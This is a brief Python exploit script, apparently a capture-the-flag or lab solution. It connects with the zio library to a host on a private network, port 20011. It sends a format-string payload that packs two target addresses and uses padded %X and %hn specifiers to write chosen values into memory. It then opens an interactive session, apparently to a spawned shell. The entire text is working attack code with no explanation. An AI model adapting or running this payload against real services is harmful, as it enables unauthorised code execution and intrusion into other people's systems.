import re
from zio import *

io = zio(("192.168.222.132", 20011))
io.read_until("\n")
io.writeline(l32(0x0804b4ec)+"%47624X."+l32(0x0804b4ee)+"%4$08hn"+"%18124X"+"%7$08hn")
io.interact()
